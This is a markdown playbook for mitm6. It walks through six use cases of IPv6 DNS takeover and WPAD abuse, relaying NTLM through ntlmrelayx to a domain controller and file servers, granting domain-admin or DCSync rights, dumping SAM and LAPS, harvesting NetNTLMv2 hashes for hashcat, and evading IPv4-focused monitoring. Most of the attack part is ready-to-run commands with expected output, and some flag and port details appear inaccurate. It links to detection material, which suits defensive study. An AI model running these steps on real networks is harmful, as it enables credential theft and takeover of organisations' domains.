# mitm6 — Hands-On Use Cases

## Prerequisites Check

Before any use case, ensure:
- Running as root/Administrator on attacker host
- Target segment has IPv6 enabled (check: `ipv6 disabled=no` on Windows targets)
- ntlmrelayx.py installed and ready (`python3 -m impacket.examples.ntlmrelayx -h`)
- Interface name known (e.g., `eth0`, `ens0`, or `en0` on macOS)

---

## Use Case 1: Domain-Wide NTLM Relay via WPAD — SMB & LDAP Relay

**Objective:** Force all users on a segment to proxy-authenticate, relay their NTLM credentials to the DC for LDAP manipulation (grant attacker DCSync rights), and to a file server for SAM dump.

**MITRE ATT&CK:** T1040 (Traffic Interception), T1557 (Man-in-the-Middle: ARP/IPv6 Spoofing), T1187 (Forced Authentication), T1557.002 (LLMNR/NBT-NS Spoofing — IPv6 variant), T1040 (Credential Interception), T1550.002 (Relay — SMB), T1550.003 (Relay — LDAP)

### Step 1: Start ntlmrelayx with dual relay targets

On attacker, in Terminal 1:

```bash
# Relay to both the DC (LDAP) and a file server (SMB)
# --no-http disables ntlmrelayx's own HTTP server (mitm6 provides it)
# -t ldap://<DC-IP> sets primary target (LDAP: modify ACLs for attacker)
# -t smb://<FILESERVER-IP> sets secondary target (SMB: dump SAM)

python3 -m impacket.examples.ntlmrelayx \
  --no-http \
  -t ldap://192.168.1.10 \
  -t smb://192.168.1.50 \
  -socks \
  -vv

# Expected output:
# [*] Setting up SOCKS server on 127.0.0.1:1080
# [*] LDAP Relay INITIATED ...
# [*] SMB Relay INITIATED ...
# (listens on 127.0.0.1:6666 for mitm6's relay traffic by default)
```

### Step 2: Start mitm6 with relay mode enabled

In Terminal 2:

```bash
# Relay captured NTLM to ntlmrelayx on localhost:6666
# -i eth0: bind to eth0 (your attack segment interface)
# --relay 127.0.0.1:6666: forward NTLM to ntlmrelayx
# -vv: very verbose (see every RA, DHCP, DNS query, auth)

sudo mitm6 \
  -i eth0 \
  --relay 127.0.0.1:6666 \
  --domain corp.local \
  --host mitm6 \
  -vv

# Expected output:
# [*] Starting mitm6 on interface eth0
# [*] ICMPv6 RA sender started, sending to ff02::1
# [*] DHCPv6 server started on port 546
# [*] DNS server started on port 53
# [*] HTTP server started on port 80
# [*] Waiting for clients...
```

### Step 3: Wait for user activity and observe relay

Users on the segment will:
1. Receive ICMPv6 RA with attacker's prefix → configure IPv6 address.
2. Receive DHCPv6 with attacker's DNS → begin resolving via mitm6.
3. Browser/Windows tries WPAD → mitm6 returns malicious PAC.
4. Browser proxies HTTP through mitm6:8080 → prompted for auth.
5. User enters NTLM creds (cached/transparent) → mitm6 captures and relays.

**In ntlmrelayx Terminal (Terminal 1), observe:**

```
[*] Received NTLM auth from <victim-ip> for user CORP\alice
[*] Relaying to ldaps://192.168.1.10
[+] Successfully authenticated! Adding attacker to Domain Admins group...
[*] Relaying to smb://192.168.1.50
[+] Dumping SAM from ADMIN$...
```

### Step 4: Verify privileges granted

If relay succeeded, attacker now has (via ntlmrelayx's SOCKS proxy):

```bash
# From attacker, connect to DC via SOCKS relay
proxychains4 rpcclient -U corp.local/attacker%<anything> 192.168.1.10

# Or use bloodhound-python to enumerate from this new privileged state
python3 bloodhound.py \
  -u 'corp.local\attacker' \
  -p 'anything' \
  -d corp.local \
  -dc 192.168.1.10 \
  --use-socks \
  --socks-proxy 127.0.0.1:1080
```

---

## Use Case 2: Credential Harvesting for Offline Cracking (No Relay)

**Objective:** Capture NetNTLMv2 hashes from proxy authentication without relay, for offline hashcat cracking.

**MITRE ATT&CK:** T1040 (Traffic Interception), T1557 (MiTM), T1187 (Forced Authentication), T1110.003 (Password Spraying / Cracking)

### Step 1: Start mitm6 without relay (standalone capture)

```bash
# Run without --relay; hashes written to logfile
sudo mitm6 \
  -i eth0 \
  --domain corp.local \
  --logfile mitm6_hashes.log \
  -vv
```

### Step 2: Monitor captured hashes

As users proxy-authenticate:

```bash
# In another terminal, tail the log
tail -f mitm6_hashes.log

# Output includes lines like:
# [*] NTLM auth from CORP\alice (192.168.1.100):
# NetNTLMv2: CORP\alice::CORP:1122334455667788:8899aabbccddeeff0011223344556677
```

### Step 3: Extract and crack with hashcat

```bash
# Extract hashes from log (format: <domain>\<user>::<domain>:<challenge>:<response>)
grep "NetNTLMv2" mitm6_hashes.log | sed 's/.*NetNTLMv2: //' > hashes.txt

# Crack with hashcat (mode 5600 = NetNTLMv2)
hashcat -m 5600 -a 0 hashes.txt wordlist.txt
```

---

## Use Case 3: Targeted Relay to Print Server (Malicious Printer Takeover)

**Objective:** Relay captured NTLM only to a print server (not DC/file server), to gain control for print-job-based payload delivery or print-config exfiltration.

**MITRE ATT&CK:** T1187 (Forced Authentication), T1550.002 (Relay — SMB/Print Server)

### Step 1: Start ntlmrelayx targeting print server only

```bash
python3 -m impacket.examples.ntlmrelayx \
  --no-http \
  -t smb://192.168.1.60 \
  --dump-laps \
  -vv
```

### Step 2: Start mitm6 as before

```bash
sudo mitm6 \
  -i eth0 \
  --relay 127.0.0.1:6666 \
  -vv
```

### Step 3: Access print server after relay succeeds

```bash
# Once relay succeeds, ntlmrelayx offers SOCKS access
# Connect and interact with print server admin shares
proxychains4 rpcclient -U corp.local/print\$ 192.168.1.60 -c "enumdrivers 3"
```

---

## Use Case 4: IPv6-Only Segment (Stealth Against IPv4-Only Monitoring)

**Objective:** On a mixed IPv4/IPv6 segment where IDS/monitoring is IPv4-focused, use mitm6 for credential capture with reduced detection risk.

**MITRE ATT&CK:** T1040 (Traffic Interception), T1557 (MiTM), T1187 (Forced Authentication)

### Step 1: Confirm no RA-guard

```bash
# From attacker, send test ICMPv6 RA; if dropped, RA-guard is active
# If you receive ICMP unreachable or no response after 10 seconds, you can proceed

# Most networks do not have RA-guard enabled; it's rare in practice
```

### Step 2: Run mitm6 normally

```bash
sudo mitm6 \
  -i eth0 \
  --relay 127.0.0.1:6666 \
  --ipv6-prefix fd00::/64 \
  -vv
```

**Why stealth:** Attackers logging IPv4 ARP poisoning or DHCP abuse will not see this IPv6-based attack. Modern networks with Zeek/Suricata **should** detect ICMPv6 RA spoofing, but legacy IDS systems often don't monitor IPv6 at all.

---

## Use Case 5: Segment Reconnaissance (Passive Hash Capture)

**Objective:** Run mitm6 in "capture-only" mode to harvest all NTLM hashes from a segment over time, without relay.

**MITRE ATT&CK:** T1040 (Traffic Interception), T1187 (Forced Authentication)

### Step 1: Start mitm6 in background

```bash
sudo nohup mitm6 \
  -i eth0 \
  --domain corp.local \
  --logfile mitm6_harvested.log \
  > mitm6.out 2>&1 &
```

### Step 2: Wait for hashes to accumulate

Over hours/days, users accessing resources will authenticate through the proxy:

```bash
# Monitor progress
watch -n 5 "grep 'NetNTLMv2' mitm6_harvested.log | wc -l"
```

### Step 3: Periodically extract and crack

```bash
# Every day/week, rotate logs and crack
grep "NetNTLMv2" mitm6_harvested.log | sed 's/.*NetNTLMv2: //' > hashes.txt

# Crack offline (can run in parallel with mitm6 still capturing)
hashcat -m 5600 -a 0 --session segment_crack hashes.txt wordlist.txt
```

---

## Use Case 6: Chained Relay to DC + Multiple File Servers

**Objective:** Simultaneously relay one user's NTLM to both the DC (for privilege escalation via LDAP ACL modification) and multiple file servers (for lateral movement).

**MITRE ATT&CK:** T1187 (Forced Authentication), T1550.002 (Relay — SMB), T1550.003 (Relay — LDAP)

### Step 1: Start ntlmrelayx with multiple targets

```bash
python3 -m impacket.examples.ntlmrelayx \
  --no-http \
  -t ldap://192.168.1.10 \
  -t smb://192.168.1.50 \
  -t smb://192.168.1.51 \
  -t smb://192.168.1.52 \
  --dump-laps \
  -socks \
  -vv
```

### Step 2: Start mitm6

```bash
sudo mitm6 \
  -i eth0 \
  --relay 127.0.0.1:6666 \
  -vv
```

### Step 3: Observe multi-target relay

```
# ntlmrelayx simultaneously:
# 1. Modifies LDAP ACLs on DC
# 2. Dumps SAM on fileserver1
# 3. Dumps SAM on fileserver2
# 4. Dumps SAM on fileserver3
# All from a single intercepted NTLM session
```

---

## Key Operational Notes

**Timing & Persistence:** mitm6 must remain running to continue capturing. Users may only authenticate when:
- First login to the segment (usually early morning).
- Accessing shared resources requiring re-auth.
- Proxy-cache expiry (varies by browser/OS, typically hours).

For persistent collection, run mitm6 continuously (e.g., systemd service).

**Detection Evasion:**
- **IPv6-only networks**: Reduced detection risk on IPv4-focused monitoring.
- **Custom RA prefix**: Using operator-controlled ULA (e.g., `fd00::/64`) vs. global unicast makes the traffic "look" less suspicious to raw packet inspection (though equally detected by DHCPv6-Guard if enabled).
- **Disabling HTTP**: `--no-http` prevents mitm6 from serving WPAD, but WPAD still works if the client resolves it via DNS and connects to attacker's HTTP server (race condition favors attacker).

**Limitations:**
- Does **not** work if IPv6 is disabled on targets.
- Does **not** work if RA-guard (RFC 6105) or DHCPv6-Guard is enabled.
- Does **not** capture credentials from non-HTTP/proxy services.
- Relay attacks can be blocked by SMB signing (requires `-auth-smb` creds to bypass) or LDAP signing (ntlmrelayx has limited bypass options).

---

**Next:** See `03 - Source Evidence.md` for attacker-side artifacts, `04 - Target Evidence.md` for victim-side evidence, and `05 - Detection and Hunting.md` for detection strategies.
